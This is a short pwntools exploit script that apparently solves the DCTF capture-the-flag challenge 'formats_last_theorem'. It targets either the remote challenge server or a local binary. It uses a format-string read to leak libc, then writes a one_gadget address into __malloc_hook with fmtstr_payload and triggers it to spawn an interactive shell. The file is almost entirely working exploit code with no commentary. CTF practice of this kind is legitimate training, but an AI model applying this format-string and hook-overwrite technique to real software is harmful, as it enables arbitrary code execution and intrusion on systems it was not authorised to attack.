#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./formats_last_theorem')

if args.REMOTE:
	p = remote('dctf-chall-formats-last-theorem.westeurope.azurecontainer.io', 7482)
	libc = ELF('./libc.so.6')
else:
	import signal
	p = process(('stdbuf -i0 -o0 -e0 '+binary.path).split(),preexec_fn=lambda: signal.signal(signal.SIGALRM, signal.SIG_IGN))
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# one_gadget
libc.symbols['gadget'] = [0x4f3d5, 0x4f432, 0x10a41c][1]

p.sendlineafter('point\n','%23$p')
p.recvuntil('entered\n')
__libc_start_main = int(p.recvline().strip(),16) - 231
libc.address = __libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))
p.sendlineafter('point\n',fmtstr_payload(6,{libc.sym.__malloc_hook:libc.sym.gadget},write_size='short'))
p.sendlineafter('point\n','%65536c')
p.recvuntil('entered\n')
p.interactive()

